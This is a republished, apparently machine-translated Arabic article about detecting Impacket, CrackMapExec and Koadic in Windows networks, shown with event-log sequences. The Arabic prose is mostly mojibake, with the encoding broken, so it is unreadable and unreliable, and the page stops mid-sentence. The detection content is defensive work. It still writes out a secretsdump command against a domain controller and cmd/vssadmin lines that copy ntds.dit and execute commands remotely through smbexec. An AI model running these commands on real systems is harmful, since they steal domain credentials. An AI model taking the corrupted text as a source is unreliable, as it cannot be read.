<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>๐คณ๐ฟ โ๏ธ ๐ฅ ููููุฉ ุงูุชุดุงู ุงููุฌูุงุช ุนูู ุงูุจููุฉ ุงูุฃุณุงุณูุฉ ููุธุงู Windows: ุงุณุชูุดุงู ุฃุฏูุงุช ุงููุฑุตูุฉ ๐ ๐ ๐</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ูุชุฒุงูุฏ ุนุฏุฏ ุงููุฌูุงุช ูู ูุทุงุน ุงูุดุฑูุงุช ูู ุนุงู: ุนูู ุณุจูู ุงููุซุงู ุ ูู ุนุงู 2017 ุ ุณุฌูุช ุญูุงุฏุซ ูุฑูุฏุฉ ุจูุณุจุฉ 13ูช ุฃูุซุฑ ูู ุนุงู 2016 ุ ูุจููุงูุฉ ุนุงู 2018 ุ ุณุฌูุช ุญูุงุฏุซ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ููููุฉ ุงูุชุดุงู ุงููุฌูุงุช ุนูู ุงูุจููุฉ ุงูุฃุณุงุณูุฉ ููุธุงู Windows: ุงุณุชูุดุงู ุฃุฏูุงุช ุงููุฑุตูุฉ</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/460517/" style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u="><img src="https://habrastorage.org/webt/qm/kv/ra/qmkvra9qmrta93tfbev2d6pdm7k.png"></a> <br><br>  ูุชุฒุงูุฏ ุนุฏุฏ ุงููุฌูุงุช ูู ูุทุงุน ุงูุดุฑูุงุช ูู ุนุงู: ุนูู ุณุจูู ุงููุซุงู ุ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูู ุนุงู 2017 ุ ุณุฌูุช ุญูุงุฏุซ ูุฑูุฏุฉ ุจูุณุจุฉ 13ูช ุฃูุซุฑ</a> ูู ุนุงู 2016 ุ ูุจููุงูุฉ ุนุงู 2018 ุ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุณุฌูุช</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุญูุงุฏุซ ุจูุณุจุฉ 27ูช ุฃูุซุฑ</a> ููุง <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุงูุช</a> ุนููู ูู ุงููุชุฑุฉ ุงูุณุงุจูุฉ.  ุจูุง ูู ุฐูู ุชูู ุงูุชู ุชููู ูููุง ุฃุฏุงุฉ ุงูุนูู ุงูุฑุฆูุณูุฉ ูู ูุธุงู ุงูุชุดุบูู ูููุฏูุฒ.  ูู 2017-2018 ุ ูุงุฌูุช <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุฌููุนุงุช</a> APT Dragonfly ู APT28 ู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">APT MuddyWater ุงูููุธูุงุช</a> ุงูุญููููุฉ ูุงูุนุณูุฑูุฉ ูู ุฃูุฑูุจุง ูุฃูุฑููุง ุงูุดูุงููุฉ ูุงูููููุฉ ุงูุนุฑุจูุฉ ุงูุณุนูุฏูุฉ.  ูุงุณุชุฎุฏููุง ุซูุงุซ ุฃุฏูุงุช ููุฐุง - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Impacket</a> ุ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">CrackMapExec</a> ู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Koadic</a> .  ุดูุฑุฉ ุงููุตุฏุฑ ููุชูุญุฉ ููุชุงุญุฉ ุนูู ุฌูุซุจ. <br><br>  ุชุฌุฏุฑ ุงูุฅุดุงุฑุฉ ุฅูู ุฃู ูุฐู ุงูุฃุฏูุงุช ูุง ุชุณุชุฎุฏู ููุงุฎุชุฑุงู ุงูุฃููู ุ ูููู ูุชุทููุฑ ูุฌูู ุฏุงุฎู ุงูุจููุฉ ุงูุชุญุชูุฉ.  ูุณุชุฎุฏููุง ุงูููุงุฌููู ูู ูุฑุงุญู ูุฎุชููุฉ ูู ุงููุฌูู ุ ูุชุจุนูู ุจุนุฏ ุงูุชุบูุจ ุนูู ุงููุญูุท.  ุจุงูููุงุณุจุฉ ุ ูู ุงูุตุนุจ ุงูุชุดุงู ุฐูู ูุบุงูุจูุง ุจูุณุงุนุฏุฉ ุงูุชูููุงุช <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุงูุชุดุงู ุขุซุงุฑ ุงูุชุณููุฉ ูู ุญุฑูุฉ ูุฑูุฑ ุงูุดุจูุฉ</a> ุฃู ุงูุฃุฏูุงุช ุงูุชู ูููููุง <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูุชุดุงู ุงูุฅุฌุฑุงุกุงุช ุงููุดุทุฉ ููููุงุฌููู ุจุนุฏ ุงุฎุชุฑุงูู ููุจููุฉ ุงูุชุญุชูุฉ</a> .  ุชููุฑ ุงูุฃุฏูุงุช ุงูุนุฏูุฏ ูู ุงููุธุงุฆู - ูู ููู ุงููููุงุช ุฅูู ุงูุชูุงุนู ูุน ุงูุณุฌู ูุชูููุฐ ุงูุฃูุงูุฑ ุนูู ุฌูุงุฒ ุจุนูุฏ.  ููุฏ ุฃุฌุฑููุง ุฏุฑุงุณุฉ ููุฐู ุงูุฃุฏูุงุช ูุชุญุฏูุฏ ูุดุงุท ุดุจูุชูุง. <a name="habracut"></a><br><br>  ูุง ูุชุนูู ุนูููุง ุงูููุงู ุจู: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  <b>ููู ููููุฉ ุนูู ุฃุฏูุงุช ุงููุฑุตูุฉ</b> .  ุชุนุฑู ุนูู ูุง ูุญุชุงุฌู ุงูููุงุฌููู ููุชุดุบูู ูุงูุชูููุงุช ุงูุชู ูููููู ุงุณุชุฎุฏุงููุง. </li><li style=";text-align:right;direction:rtl"> <b>ุงุจุญุซ ุนู ูุง ูู ูุชู ุงูุชุดุงูู ุจูุงุณุทุฉ ุฃุฏูุงุช ุฃูุงู ุงููุนูููุงุช ูู ุงููุฑุงุญู ุงูุฃููู ูู ุงููุฌูู</b> .  ูููู ุชุฎุทู ูุฑุญูุฉ ุงูุงุณุชุฎุจุงุฑุงุช ุ ุฅูุง ูุฃู ุงูููุงุฌู ููุงุฌู ุฏุงุฎูู ุ ุฃู ูุฃู ุงูููุงุฌู ูุณุชุบู ูุฌูุฉ ูู ุงูุจููุฉ ุงูุชุญุชูุฉ ูู ุชูู ูุนุฑููุฉ ูู ูุจู.  ููุงู ูุฑุตุฉ ูุงุณุชุนุงุฏุฉ ุณูุณูุฉ ูุงููุฉ ูู ุฃูุนุงูู ุ ูุจุงูุชุงูู ุงูุฑุบุจุฉ ูู ุงูุชุดุงู ูุฒูุฏ ูู ุงูุญุฑูุฉ. </li><li style=";text-align:right;direction:rtl">  <b>ุงููุถุงุก ุนูู ุฅูุฐุงุฑุงุช ูุงุฐุจุฉ ูู ุฃุฏูุงุช ูุดู ุงูุชุณูู</b> .  ูุฌุจ ุฃูุง ููุณู ุฃูู ุนูุฏ ุงูุชุดุงู ุฃุนูุงู ูุนููุฉ ุนูู ุฃุณุงุณ ุงูุฐูุงุก ูุญุฏู ุ ูุฅู ุงูุฃุฎุทุงุก ุงููุชูุฑุฑุฉ ููููุฉ.  ุนุงุฏุฉู ูุง ููุฌุฏ ูู ุงูุจููุฉ ุงูุชุญุชูุฉ ุนุฏุฏ ูุงูู ูู ุงูุทุฑู ุ ุงูุชู ูุง ูููู ุชูููุฒูุง ุนู ุงููุธุฑุฉ ุงูุฃููู ุ ููุญุตูู ุนูู ุฃู ูุนูููุงุช. </li></ul><br>  ูุงุฐุง ุชุนุทู ูุฐู ุงูุฃุฏูุงุช ููููุงุฌูููุ  ุฅุฐุง ูุงู ูุฐุง ูู Impacket ุ ูุณูุญุตู ุงูููุงุฌููู ุนูู ููุชุจุฉ ูุจูุฑุฉ ูู ุงููุญุฏุงุช ุงูุชู ูููู ุงุณุชุฎุฏุงููุง ูู ูุฑุงุญู ูุฎุชููุฉ ูู ุงููุฌูู ุ ุจุนุฏ ุงุฎุชุฑุงู ุงููุญูุท.  ุชุณุชุฎุฏู ุงูุนุฏูุฏ ูู ุงูุฃุฏูุงุช ูุญุฏุงุช Impacket ุฏุงุฎู ููุณูุง - ุนูู ุณุจูู ุงููุซุงู ุ Metasploit.  ูุฏููุง dcomexec ู wmiexec ูุชูููุฐ ุงูุฃูุงูุฑ ุนู ุจุนุฏ ุ secretsdump ูุงุณุชุฑุฏุงุฏ ุงูุญุณุงุจุงุช ูู ุงูุฐุงูุฑุฉ ุงูุชู ุชูุช ุฅุถุงูุชูุง ูู Impacket.  ูุชูุฌุฉ ูุฐูู ุ ุณูุชู ุฃูุถูุง ุถูุงู ุงููุดู ุงูุตุญูุญ ุนู ูุดุงุท ูุฐู ุงูููุชุจุฉ ูู ุฎูุงู ุงููุดู ุนู ุงููุดุชูุงุช. <br><br>  ุญูู CrackMapExec (ุฃู ุจุจุณุงุทุฉ CME) ุ ูุชุจ ุงููุจุฏุนูู ุนู ุทุฑูู ุงูุตุฏูุฉ "ูุฏุนูู ูู Impacket".  ุจุงูุฅุถุงูุฉ ุฅูู ุฐูู ุ ูุฏู CME ูุธููุฉ ุฌุงูุฒุฉ ููุณููุงุฑูููุงุช ุงูุดุงุฆุนุฉ: ุฅููุง Mimikatz ููุญุตูู ุนูู ูููุงุช ุงููุฑูุฑ ุฃู ุงูุชุฌุฒุฆุฉ ุงูุฎุงุตุฉ ุจูุง ุ ูุชูููุฐ Meterpreter ุฃู ูููู Empire ููุชูููุฐ ุนู ุจุนุฏ ุ ู Bloodhound ุนูู ูุชููุง. <br><br>  ุงูุฃุฏุงุฉ ุงูุซุงูุซุฉ ุงูุชู ุงุฎุชุฑูุงูุง ูู Koadic.  ุฅูู ุฌุฏูุฏ ุชูุงููุง ุ ููุฏ ุชู ุชูุฏููู ูู ูุคุชูุฑ DEFCON 25 ุงูุฏููู ูููุฑุงุตูุฉ ูู ุนุงู 2017 ุ ููุง ูุชููุฒ ุจููุฌ ุบูุฑ ููุงุณู: ุงูุนูู ุนุจุฑ HTTP ู Java Script ู Microsoft Visual Basic Script (VBS).  ููุทูู ุนูู ูุฐุง ุงูุฃุณููุจ ุงูุนูุด ุฎุงุฑุฌ ุงูุฃุฑุถ: ุชุณุชุฎุฏู ุงูุฃุฏุงุฉ ูุฌููุนุฉ ูู ุงูุชุจุนูุงุช ูุงูููุชุจุงุช ุงููุฏูุฌุฉ ูู Windows.  ูุทูู ุนููู ุงููุจุฏุนูู ุนูุตุฑ ุชุญูู ุฃูุฑ COM ุฃู C3. <br><br><h2 style=";text-align:right;direction:rtl">  IMPACKET </h2><br>  ูุธููุฉ Impacket ูุงุณุนุฉ ููุบุงูุฉ ุ ุจุฏุกุงู ูู ุงูุงุณุชุทูุงุน ุฏุงุฎู AD ูุฌูุน ุงูุจูุงูุงุช ูู ุฎูุงุฏู MS SQL ุงูุฏุงุฎููุฉ ุ ูุงูุชู ุชูุชูู ุจุชูููุงุช ุงูุญุตูู ุนูู ุจูุงูุงุช ุงูุงุนุชูุงุฏ: ูุฐุง ูุฌูู ุชุฑุญูู SMB ููุชููู ููู ntds.dit ูุญุชูู ุนูู ุชุฌุฒุฆุฉ ูููุฉ ูุฑูุฑ ุงููุณุชุฎุฏู ูู ูุญุฏุฉ ุชุญูู ูุฌุงู.  ูููุฐ Impacket ุฃูุถูุง ุงูุฃูุงูุฑ ุนู ุจูุนุฏ ุจุงุณุชุฎุฏุงู ุฃุฑุจุน ุทุฑู ูุฎุชููุฉ: ูู ุฎูุงู WMI ุ ููู ุฎุฏูุฉ ูุฅุฏุงุฑุฉ ุฌุฏููุฉ Windows ู DCOM ู SMB ุ ูููุฐุง ููู ุชุญุชุงุฌ ุฅูู ุจูุงูุงุช ุงุนุชูุงุฏ. <br><br><h3 style=";text-align:right;direction:rtl">  Secretsdump </h3><br>  ุฏุนููุง ูููู ูุธุฑุฉ ุนูู ุฃุณุฑุงุฑ ุชูุฑูุบ.  ูุฐู ูุญุฏุฉ ููุทูุฉ ูููู ุฃู ูููู ุบุฑุถูุง ุฃุฌูุฒุฉ ุงููุณุชุฎุฏู ููุญุฏุงุช ุงูุชุญูู ุจุงููุฌุงู.  ุจุงุณุชุฎุฏุงูู ุ ููููู ุงูุญุตูู ุนูู ูุณุฎ ูู ููุงุทู ุงูุฐุงูุฑุฉ LSA ู SAM ู SECURITY ู NTDS.dit ุ ุจุญูุซ ูููู ุฑุคูุชูุง ูู ูุฑุงุญู ูุฎุชููุฉ ูู ุงููุฌูู.  ุงูุฎุทูุฉ ุงูุฃููู ูู ุชุดุบูู ุงููุญุฏุฉ ุงูููุทูุฉ ูู ุงููุตุงุฏูุฉ ุนุจุฑ SMB ุ ูุงูุชู ุชุชุทูุจ ุฅูุง ูููุฉ ูุฑูุฑ ูุณุชุฎุฏู ุฃู ุชุฌุฒุฆุฉ ููุง ูุฅุฌุฑุงุก ูุฌูู Pass the Hash ุชููุงุฆููุง.  ุงูุชุงูู ูู ุทูุจ ููุชุญ ุงููุตูู ุฅูู ุฅุฏุงุฑุฉ ุงูุชุญูู ุจุงูุฎุฏูุฉ (SCM) ูุงููุตูู ุฅูู ุงูุณุฌู ุจุงุณุชุฎุฏุงู ุจุฑูุชูููู winreg ุ ุจุงุณุชุฎุฏุงู ููุงุฌู ููููู ูุนุฑูุฉ ุจูุงูุงุช ุงููุฑูุน ุงูุชู ุชููู ูุงูุญุตูู ุนูู ุงููุชุงุฆุฌ ูู ุฎูุงู SMB. <br><br>  ูู ุงูุชูู.  1 ูุฑู ููู ุจุงูุถุจุท ุนูุฏ ุงุณุชุฎุฏุงู ุงููุตูู ุฅูู ุจุฑูุชูููู winreg ุนู ุทุฑูู ููุชุงุญ ุงูุชุณุฌูู ูุน LSA.  ููููุงู ุจุฐูู ุ ุงุณุชุฎุฏู ุงูุฃูุฑ DCERPC ูุน ุดูุฑุฉ ุงูุชุดุบูู 15 - OpenKey. <br><br><img src="https://habrastorage.org/webt/28/g3/uf/28g3ufutlahahdolf8mne9sa4q4.png"><br>  <i>ุงูุชูู.</i>  <i>1. ูุชุญ ููุชุงุญ ุงูุชุณุฌูู ุจุงุณุชุฎุฏุงู ุจุฑูุชูููู winreg</i> <br><br>  ุนูุงูุฉ ุนูู ุฐูู ุ ุนูุฏ ุงูุญุตูู ุนูู ููุชุงุญ ุงููุตูู ุ ูุชู ุญูุธ ุงูููู ุจุงุณุชุฎุฏุงู ุฃูุฑ SaveKey ุจุงุณุชุฎุฏุงู ุดูุฑุฉ ุงูุชุดุบูู 20. ูุฌุนู Impacket ูุฐุง ุงูุฃูุฑ ูุญุฏุฏูุง ููุบุงูุฉ.  ูุญูุธ ุงูููู ุฅูู ููู ุงุณูู ุณูุณูุฉ ูู 8 ุฃุญุฑู ุนุดูุงุฆูุฉ ูุน ุฅุถุงูุฉ .tmp.  ุจุงูุฅุถุงูุฉ ุฅูู ุฐูู ุ ูุญุฏุซ ุชูุฑูุบ ุฅุถุงูู ููุฐุง ุงูููู ุนุจุฑ SMB ูู ุฏููู System32 (ุงูุดูู 2). <br><br><img src="https://habrastorage.org/webt/v8/o-/56/v8o-56ycynu817pivdpr65jvtk8.png"><br>  <i>ุงูุชูู.</i>  <i>2. ูุฎุทุท ููุญุตูู ุนูู ููุชุงุญ ุงูุชุณุฌูู ูู ุฌูุงุฒ ุจุนูุฏ</i> <br><br>  ุงุชุถุญ ุฃูู ููููู ุงูุชุดุงู ูุซู ูุฐุง ุงููุดุงุท ุนูู ุงูุดุจูุฉ ุนู ุทุฑูู ุงูุงุณุชุนูุงู ุนู ูุฑูุน ุงูุชุณุฌูู ูุนููุฉ ุจุงุณุชุฎุฏุงู ุจุฑูุชูููู winreg ุ ุฃุณูุงุก ูุญุฏุฏุฉ ุ ุงูุฃูุงูุฑ ุ ูุชุฑุชูุจูุง. <br><br>  ุชุชุฑู ูุฐู ุงููุญุฏุฉ ุฃูุถูุง ุขุซุงุฑูุง ูู ุณุฌู ุฃุญุฏุงุซ Windows ุ ุจุณุจุจ ุงูุชุดุงููุง ุจุณูููุฉ.  ุนูู ุณุจูู ุงููุซุงู ุ ูุชูุฌุฉ ููุฃูุฑ <br><br><pre style=";text-align:right;direction:rtl"><code class="bash hljs">secretsdump.py -debug -system SYSTEM -sam SAM -ntds NTDS -security SECURITY -bootkey BOOTKEY -outputfile 1.txt -use-vss -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span>-method mmcexec -user-status -dc-ip 192.168.202.100 -target-ip 192.168.202.100 contoso/Administrator:@DC</code> </pre> <br>  ูู ุณุฌู Windows Server 2016 ุ ุณูุฑู ุชุณูุณู ุงูุฃุญุฏุงุซ ุงูุชุงูู: <br><br>  1. 4624 - ุชุณุฌูู ุงูุฏุฎูู ุนู ุจุนุฏ. <br>  2. 5145 - ุงูุชุญูู ูู ุญููู ุงููุตูู ุฅูู ุฎุฏูุฉ winreg ุนู ุจุนุฏ. <br>  3. 5145 - ุงูุชุญูู ูู ุฃุฐููุงุช ุงููููุงุช ูู ุงูุฏููู System32.  ูุญุชูู ุงูููู ุนูู ุงูุงุณู ุงูุนุดูุงุฆู ุงููุฐููุฑ ุฃุนูุงู. <br>  4. 4688 - ุฅูุดุงุก ุนูููุฉ cmd.exe ุงูุชู ุชุทูู vssadmin: <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">โC:\windows\system32\cmd.exe<span class="hljs-string"><span class="hljs-string">" /Q /c echo c:\windows\system32\cmd.exe /C vssadmin list shadows ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span></span></code> </pre> <br>  5. 4688 - ุฅูุดุงุก ุนูููุฉ ุจุงุณุชุฎุฏุงู ุงูุฃูุฑ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin create shadow /For=C: ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  6. 4688 - ุฅูุดุงุก ุนูููุฉ ุจุงุณุชุฎุฏุงู ุงูุฃูุฑ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit %SYSTEMROOT%\Temp\rmumAfcn.tmp ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  7. 4688 - ุฅูุดุงุก ุนูููุฉ ุจุงุณุชุฎุฏุงู ุงูุฃูุฑ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin delete shadows /For=C: /Quiet ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br><h3 style=";text-align:right;direction:rtl">  Smbexec </h3><br>  ูุซู ุงูุนุฏูุฏ ูู ุฃุฏูุงุช ูุง ุจุนุฏ ุงูุงุณุชุบูุงู ุ ูุฏู Impacket ูุญุฏุงุช ูุชูููุฐ ุงูุฃูุงูุฑ ุนู ุจูุนุฏ.  ุณูุฑูุฒ ุนูู smbexec ุ ูุงูุฐู ูููุฑ ุบูุงู ุชูุงุนูู ุนูู ุฌูุงุฒ ุจุนูุฏ.  ุชุชุทูุจ ูุฐู ุงููุญุฏุฉ ุฃูุถูุง ูุตุงุฏูุฉ SMB ุฅูุง ุจุงุณุชุฎุฏุงู ูููุฉ ูุฑูุฑ ุฃู ุชุฌุฒุฆุฉ ููุง.  ูู ุงูุชูู.  3 ูุฑู ูุซุงูุงู ุนูู ููููุฉ ุนูู ูุฐู ุงูุฃุฏุงุฉ ุ ููู ูุฐู ุงูุญุงูุฉ ูู ูุญุฏุฉ ุชุญูู ุงููุณุคูู ุงููุญูู. <br><br><img src="https://habrastorage.org/webt/65/dx/os/65dxos1pwb3v9sy457qqqcasjzi.png"><br>  <i>ุงูุชูู.</i>  <i>3. Smbexec ูุญุฏุฉ ุงูุชุญูู ุงูุชูุงุนููุฉ</i> <br><br>  ุชููู ุงูุฎุทูุฉ ุงูุฃููู ูู smbexec ุจุนุฏ ุงููุตุงุฏูุฉ ูู ูุชุญ SCM ุจุงุณุชุฎุฏุงู ุงูุฃูุฑ OpenSCManagerW (15).  ุงูุทูุจ ุฌุฏูุฑ ุจุงูููุงุญุธุฉ: ููู ุ ุชู ุชุนููู ุญูู MachineName ุฅูู DUMMY. <br><br><img src="https://habrastorage.org/webt/rr/ob/go/rrobgonzydm5evu36sxa3awiw0k.png"><br>  <i>ุงูุชูู.</i>  <i>4. ุทูุจ โโููุชุญ ูุฏูุฑ ูุฑุงูุจุฉ ุงูุฎุฏูุฉ</i> <br><br>  ุจุนุฏ ุฐูู ุ ูุชู ุฅูุดุงุก ุฎุฏูุฉ ุจุงุณุชุฎุฏุงู ุงูุฃูุฑ CreateServiceW (12).  ูู ุญุงูุฉ smbexec ุ ูููููุง ุฃู ูุฑู ููุณ ููุทู ุจูุงุก ุงููุฑูู ูู ูู ูุฑุฉ.  ูู ุงูุชูู.  5 ุงูุฃุฎุถุฑ ูุดูุฑ ุฅูู ุงููุนููุงุช ุงูุซุงุจุชุฉ ููุฃูุฑ ุ ุงูุฃุตูุฑ - ูุง ูููู ููููุงุฌู ุชุบููุฑู.  ูู ุงูุณูู ููุงุญุธุฉ ุฃูู ูููู ุชุบููุฑ ุงุณู ุงูููู ุงููุงุจู ููุชูููุฐ ูุฏูููู ูููู ุงูุฅุฎุฑุงุฌ ุ ูููู ูููู ุชุบููุฑ ุงูุจุงูู ุฃูุซุฑ ุตุนูุจุฉ ุฏูู ุงูุชูุงู ููุทู ูุญุฏุฉ Impacket. <br><br><img src="https://habrastorage.org/webt/in/na/fo/innafo8sq7hwikto5cli9sv9-ow.png"><br>  <i>ุงูุชูู.</i>  <i>5. ุทูุจ โโุฅูุดุงุก ุฎุฏูุฉ ุจุงุณุชุฎุฏุงู ุฅุฏุงุฑุฉ ุงูุชุญูู ุจุงูุฎุฏูุฉ</i> <br><br>  Smbexec ุฃูุถุงู ูุชุฑู ุขุซุงุฑ ูุงุถุญุฉ ูู ุณุฌู ุฃุญุฏุงุซ Windows.  ูู ุณุฌู Windows Server 2016 ูููุฐููุฉ ุงูุชูุงุนููุฉ ุจุงุณุชุฎุฏุงู ุฃูุฑ ipconfig ุ ุณูุฑู ุชุณูุณู ุงูุฃุญุฏุงุซ ุงูุชุงูู: <br><br>  1. 4697 - ุชุซุจูุช ุงูุฎุฏูุฉ ุนูู ุฌูุงุฒ ุงูุถุญูุฉ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  2. 4688 - ุฅูุดุงุก ุนูููุฉ cmd.exe ูุน ุงููุณุงุฆุท ูู ุงูููุฑุฉ 1. <br>  3. 5145 - ุงูุชุญูู ูู ุงูุฃุฐููุงุช ุนูู ููู __output ูู ุฏููู C $. <br>  4. 4697 - ุชุซุจูุช ุงูุฎุฏูุฉ ุนูู ุฌูุงุฒ ุงูุถุญูุฉ. <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> ipconfig ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  5. 4688 - ุฅูุดุงุก ุนูููุฉ cmd.exe ุจุงุณุชุฎุฏุงู ุงููุณุงุฆุท ูู ุงูููุฑุฉ 4. <br>  6. 5145 - ุงูุชุญูู ูู ุญููู ุงููุตูู ุฅูู ููู __output ูู ุฏููู C $. <br><br>  Impacket ูู ุงูุฃุณุงุณ ูุชุทููุฑ ุฃุฏูุงุช ุงููุฌูู.  ููู ูุฏุนู ุฌููุน ุงูุจุฑูุชููููุงุช ุชูุฑูุจูุง ูู ุงูุจููุฉ ุงูุฃุณุงุณูุฉ ูู Windows ููู ุงูููุช ููุณู ูู ุฎุตุงุฆุตู ุงูุฎุงุตุฉ.  ูููุง ููู ุทูุจุงุช winreg ูุญุฏุฏุฉ ุ ูุงุณุชุฎุฏุงู ูุงุฌูุฉ ุจุฑูุฌุฉ ุชุทุจููุงุช SCM ูุน ุงูุชูููู ุงููููุฒ ููุฃูุงูุฑ ุ ูุชูุณูู ุงุณู ุงูููู ุ ููุดุงุฑูุฉ SMB SYSTEM32. <br><br><h2 style=";text-align:right;direction:rtl">  CRACKMAPEXEC </h2><br>  ุชู ุชุตููู ุฃุฏุงุฉ CME ุจุดูู ุฃุณุงุณู ูุฃุชูุชุฉ ุชูู ุงูุฅุฌุฑุงุกุงุช ุงูุฑูุชูููุฉ ุงูุชู ูุฌุจ ุนูู ุงูููุงุฌู ุงูููุงู ุจูุง ููุชูุฏู ุฏุงุฎู ุงูุดุจูุฉ.  ุงููุง ุชุณูุญ ูู ููุนูู ุฌูุจุง ุฅูู ุฌูุจ ูุน ูููู ุงูุฅูุจุฑุงุทูุฑูุฉ ุณูุฆุฉ ุงูุณูุนุฉ ู Meterpreter.  ูุชูููุฐ ุงูุฃูุงูุฑ ุณุฑุงู ุ ูููู ูู CME ุชุดููุดูุง.  ุจุงุณุชุฎุฏุงู Bloodhound (ุฃุฏุงุฉ ุงุณุชุฎุจุงุฑุงุช ูููุตูุฉ) ุ ูููู ููููุงุฌููู ุฃุชูุชุฉ ุงูุจุญุซ ุนู ุฌูุณุฉ ูุณุคูู ูุฌุงู ูุดุทุฉ. <br><br><h3 style=";text-align:right;direction:rtl">  ุงูููุจ ุงูุจูููุณู </h3><br>  Bloodhound 